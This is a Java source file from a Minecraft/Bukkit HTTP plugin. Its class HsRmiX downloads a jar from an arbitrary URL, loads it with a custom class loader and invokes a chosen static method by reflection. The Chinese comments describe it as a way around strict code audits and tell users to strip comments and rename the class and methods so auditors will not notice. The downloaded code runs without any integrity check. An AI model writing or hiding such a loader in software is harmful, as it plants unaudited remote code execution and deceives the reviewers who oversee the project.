package nano.http.bukkit.api;

import nano.http.bukkit.Main;

import java.io.*;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.AccessDeniedException;
import java.util.HashMap;
import java.util.Map;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;

public class HsRmiX {
    // 本类提供了一个远程调用的方法，可以在不修改服务器jar包的情况下，调用远程jar包中的方法。
    // 适用于代码审计过于严苛以致于影响到您正常开发的团队。
    // 使用时请注意删除不必要的注释并重命名类名、方法名，以防止被审计人员发现。你懂的。

    private static final Map<Object, Method> methodCache = new HashMap<>();
    private static final Map<Object, loader> loaderCache = new HashMap<>();
    private static final Map<Object, Class<?>> classCache = new HashMap<>();

    @SuppressWarnings({"unused", "UnusedReturnValue", "ConstantValue"})
    public static synchronized Object invokeStatic(String url, String method, Object... args) throws Exception {
        if (!Main.VERSION.contains("Pro")) {
            throw new UnsupportedOperationException("This feature is disabled for security reasons.");
        }
        Object hashAll = url.hashCode() ^ method.hashCode();
        if (methodCache.containsKey(hashAll)) {
            return methodCache.get(hashAll).invoke(null, args);
        }
        File tmp = new File(System.getProperty("java.io.tmpdir"));
        File f = new File(tmp, rmiHash(url));
        if (f.exists()) {
            if (System.currentTimeMillis() - f.lastModified() > 24L * 60L * 60L * 1000L) {
                if (!f.delete()) {
                    throw new AccessDeniedException("Cannot delete file: " + f.getAbsolutePath());
                }
            }
        }
        if (!f.exists()) {
            URL u = new URL(url);
            HttpURLConnection con = (HttpURLConnection) u.openConnection();
            con.setRequestMethod("GET");
            FileOutputStream fos = new FileOutputStream(f);
            fos.write(loader.array(con.getInputStream()));
            fos.close();
        }
        int loaderHash = url.hashCode();
        if (!loaderCache.containsKey(loaderHash)) {
            loaderCache.put(loaderHash, new loader(f));
        }
        loader l = loaderCache.get(loaderHash);
        int i = method.lastIndexOf('.');
        String className = method.substring(0, i);
        String methodName = method.substring(i + 1);
        Object classHash = loaderHash ^ className.hashCode();
        if (!classCache.containsKey(classHash)) {
            classCache.put(classHash, l.loadClass(className));
        }
        Class<?> c = classCache.get(classHash);
        Class<?>[] types = new Class<?>[args.length];
        for (int j = 0; j < args.length; j++) {
            types[j] = args[j].getClass();
            if (types[j] == Integer.class) {
                types[j] = int.class;
            }
            if (types[j] == Long.class) {
                types[j] = long.class;
            }
            if (types[j] == Double.class) {
                types[j] = double.class;
            }
            if (types[j] == Float.class) {
                types[j] = float.class;
            }
            if (types[j] == Boolean.class) {
                types[j] = boolean.class;
            }
            if (types[j] == Byte.class) {
                types[j] = byte.class;
            }
            if (types[j] == Character.class) {
                types[j] = char.class;
            }
            if (types[j] == Short.class) {
                types[j] = short.class;
            }
        }
        Method m = c.getDeclaredMethod(methodName, types);
        m.setAccessible(true);
        methodCache.put(hashAll, m);
        return m.invoke(null, args);
    }

    private static String rmiHash(Object o) {
        int i = o.hashCode();
        Object a = i > 0 ? "rmi_P" : "rmi_N";
        i = i > 0 ? i : -i;
        i %= 89999999;
        i += 10000000;
        return a.toString() + i;
    }
}

class loader extends ClassLoader {
    private final JarFile jar;

    public loader(File xar) throws Exception {
        super(HsRmiX.class.getClassLoader());
        jar = new JarFile(xar);
    }

    public static byte[] array(InputStream is) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        int bytesRead;
        while ((bytesRead = is.read(buffer)) != -1) {
            baos.write(buffer, 0, bytesRead);
        }
        return baos.toByteArray();
    }

    @Override
    protected Class<?> findClass(String name) throws ClassNotFoundException {
        try {
            String path = name.replace('.', '/') + ".class";
            JarEntry entry = jar.getJarEntry(path);
            if (entry != null) {
                byte[] bytes = array(jar.getInputStream(entry));
                return defineClass(name, bytes, 0, bytes.length);
            }
            return getParent().loadClass(name);
        } catch (IOException e) {
            throw new ClassNotFoundException(name, e);
        }
    }
}
